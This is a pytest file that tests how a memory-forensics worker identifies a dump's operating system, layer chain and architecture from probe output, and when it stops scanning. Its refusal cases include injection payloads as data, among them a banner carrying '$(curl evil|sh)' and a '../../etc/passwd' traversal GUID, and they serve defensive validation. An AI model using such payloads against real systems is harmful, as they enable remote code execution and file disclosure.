"""Root's reading of the identify probe (pure Python): layer allow-list, `os_hint`, the
Windows-vs-Linux choice, identity validation (never a diagnostic with an invalid
requirement), arch, and the probe's early scan stop."""

import pytest
from cyberlab_jobs.memory import LinuxBanner, OsHint, WindowsPdb
from pydantic import ValidationError

from memory_worker.identify import (
    IdentifyRecord,
    IdentifyRefused,
    choose,
    layer_chain,
    stop_scan,
)

PDB = {"name": "ntkrnlmp.pdb", "guid": "0123456789abcdef0123456789abcdef", "age": 1}
BANNER = "Linux version 6.1.0-26-amd64 (debian-kernel@lists.debian.org) #1 SMP"
WIN_LAYERS = ["FileLayer", "WindowsCrashDump64Layer", "WindowsIntel32e"]


def record(**fields: object) -> IdentifyRecord:
    return IdentifyRecord.model_validate({"layers": ["FileLayer"], **fields})


def test_windows() -> None:
    got = choose(record(layers=WIN_LAYERS, pdb=PDB), OsHint.AUTO)
    assert got.os == "windows" and isinstance(got.identity, WindowsPdb)
    assert got.identity.guid == PDB["guid"].upper()  # type: ignore[attr-defined]
    assert (got.layer, got.arch) == ("WindowsCrashDump64Layer>WindowsIntel32e", "x64")


def test_linux() -> None:
    got = choose(record(layers=["FileLayer", "LimeLayer"], banner=BANNER), OsHint.AUTO)
    assert got.os == "linux" and got.identity == LinuxBanner(banner=BANNER)
    assert (got.layer, got.arch) == ("LimeLayer", "x64")
    x86 = choose(record(banner="Linux version 4.4.0 (x) #1 SMP i686"), OsHint.LINUX)
    assert x86.arch == "x86" and x86.layer == "raw"


def test_both_signatures_follow_the_page_table_layer() -> None:
    both = {"pdb": PDB, "banner": BANNER}
    assert choose(record(layers=WIN_LAYERS, **both), OsHint.AUTO).os == "windows"
    assert choose(record(**both), OsHint.AUTO).os == "linux"
    assert choose(record(layers=WIN_LAYERS, **both), OsHint.LINUX).os == "linux"


@pytest.mark.parametrize(
    ("fields", "hint", "code"),
    [
        ({}, OsHint.AUTO, "os_undetermined"),
        ({"pdb": PDB}, OsHint.LINUX, "os_undetermined"),
        ({"banner": BANNER}, OsHint.WINDOWS, "os_undetermined"),
        ({"pdb": {**PDB, "name": "evil.pdb"}}, OsHint.AUTO, "os_undetermined"),
        ({"pdb": {**PDB, "guid": "../../etc/passwd"}}, OsHint.AUTO, "os_undetermined"),
        ({"pdb": {**PDB, "age": 70_000}}, OsHint.AUTO, "os_undetermined"),
        ({"banner": "Linux version 6.1\n$(curl evil|sh)"}, OsHint.AUTO, "os_undetermined"),
        (
            {"layers": ["FileLayer", "QemuSuspendLayer"], "pdb": PDB},
            OsHint.AUTO,
            "unsupported_memory_format",
        ),  # noqa: E501
        ({"layers": ["FileLayer", "XenCoreDumpLayer"]}, OsHint.AUTO, "unsupported_memory_format"),
    ],
)
def test_refusals(fields: dict[str, object], hint: OsHint, code: str) -> None:
    with pytest.raises(IdentifyRefused) as caught:
        choose(record(**fields), hint)
    assert caught.value.code == code


@pytest.mark.parametrize(
    "fields",
    [{"layers": []}, {"layers": ["File Layer!"]}, {"layers": ["A"] * 9}, {"pdb": {"name": 1}}],
)
def test_malformed_identify_output_is_invalid(fields: dict[str, object]) -> None:
    with pytest.raises(ValidationError):
        IdentifyRecord.model_validate({"layers": ["FileLayer"], **fields})


def test_the_scan_stops_once_the_answer_is_fixed() -> None:
    assert stop_scan(OsHint.WINDOWS, ["FileLayer"], pdb=True, banner=False)
    assert not stop_scan(OsHint.WINDOWS, ["FileLayer"], pdb=False, banner=True)
    assert stop_scan(OsHint.LINUX, ["FileLayer"], pdb=False, banner=True)
    assert stop_scan(OsHint.AUTO, WIN_LAYERS, pdb=True, banner=False)
    assert not stop_scan(OsHint.AUTO, WIN_LAYERS, pdb=False, banner=True)
    assert stop_scan(OsHint.AUTO, ["FileLayer"], pdb=False, banner=True)
    assert not stop_scan(OsHint.AUTO, ["FileLayer"], pdb=True, banner=False)
    assert layer_chain(["FileLayer"]) == "raw"
